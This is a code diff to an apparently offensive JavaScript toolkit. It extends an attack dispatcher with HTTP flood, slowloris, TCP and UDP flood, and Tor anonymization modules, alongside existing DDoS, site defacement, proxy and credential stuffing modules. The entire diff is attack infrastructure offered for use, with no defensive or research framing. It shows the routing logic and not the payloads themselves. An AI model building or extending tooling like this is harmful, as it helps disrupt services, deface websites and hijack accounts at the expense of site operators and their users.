@@ -1,6 +1,11 @@
 const ddosAttack = require('./ddos/ddos');
+const httpFlood = require('./ddos/http_flood');
+const slowloris = require('./ddos/slowloris');
+const tcp = require('./ddos/tcp');
+const udp = require('./ddos/udp');
 const defaceSite = require('./defacement/defacement');
 const connectionEstablish = require('./proxy/proxy');
+const torConnection = require('./tor/tor');
 const credentialStuffing = require('./credentials/credentials');
 
 const attackStatistics = {
@@ -73,11 +78,35 @@ const executeAttack = async (target, attackType, options) => {
 
         let attackModule;
         switch (attackType) {
-            case 'ddos': attackModule = ddosAttack; break;
-            case 'defacement': attackModule = defaceSite; break;
-            case 'connection': attackModule = connectionEstablish; break;
-            case 'credential': attackModule = credentialStuffing; break;
-            default: throw new Error('Invalid attack type');
+            case 'ddos':
+                attackModule = { execute: ddosAttack.execute };
+                break;
+            case 'httpFlood':
+                attackModule = { execute: httpFlood.execute };
+                break;
+            case 'slowloris':
+                attackModule = { execute: slowloris.execute };
+                break;
+            case 'tcp':
+                attackModule = { execute: tcp.execute };
+                break;
+            case 'udp':
+                attackModule = { execute: udp.execute };
+                break;
+            case 'defacement':
+                attackModule = { execute: defaceSite.execute };
+                break;
+            case 'connection':
+                attackModule = connectionEstablish;
+                break;
+            case 'tor':
+                attackModule = torConnection;
+                break;
+            case 'credential':
+                attackModule = credentialStuffing;
+                break;
+            default:
+                throw new Error('Invalid attack type');
         }
 
         if (!attackModule || typeof attackModule.execute !== 'function') {
